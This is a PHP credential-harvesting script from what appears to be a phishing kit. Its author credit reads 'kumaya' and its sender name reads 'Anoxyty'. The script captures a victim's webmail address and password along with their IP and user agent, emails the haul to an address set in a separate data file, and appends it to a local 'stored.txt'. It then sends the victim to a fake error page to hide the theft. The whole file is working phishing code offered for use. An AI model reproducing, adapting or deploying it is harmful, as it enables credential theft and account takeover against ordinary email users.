<?php 

/*       
// made by kumaya" // https://icq.im/kumaya "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['user'] ) ) {
		
		$_SESSION['user'] 	  = $_POST['user'];
		$_SESSION['pass'] 	  = $_POST['pass'];
		$code = <<<EOT
============== [ WEBMAIL Login By kumaya | ]🔥 ==============
[EMAIL ADDRESS] 		: {$_SESSION['user']}
[EMAIL PASSWORD]		: {$_SESSION['pass']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WEBMAIL Login By kumaya💼 ] =============
\r\n\r\n
EOT;

		$subject = "🏛️ WEBMAIL User Info By Anoxyty🏛️  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <webmailby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../index_error?oamo/765re45dyfughilkhjjgfdhfjghkuyt567898766576899/76yukgytyfu7iuygWQEFDZGRFg/AagdfdhrtGH64534354657UI765453WSSDF");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>